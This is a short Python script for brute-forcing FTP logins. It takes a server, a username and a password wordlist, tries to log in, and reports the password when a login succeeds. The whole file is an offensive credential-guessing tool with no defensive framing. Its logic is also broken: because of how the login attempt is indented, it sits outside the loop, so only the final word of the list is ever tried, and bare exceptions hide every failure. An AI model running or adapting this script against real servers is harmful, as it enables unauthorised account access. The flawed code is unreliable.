#!/usr/bin/python3
import ftplib

server = input("FTPServer: ")
user = input("username: ")
Passwordlist = input("Path to Password List > ")

try:
    with open(Passwordlist,'r') as pw:
        for word in pw:
            word = word.strip('\r').strip('\n')
        try:
            ftp = ftplib.FTP(server)
            ftp.login(user,word)
            print("Success! The password is " + word)
        except:
            print('Still trying...')
except:
    print("Wordlist error")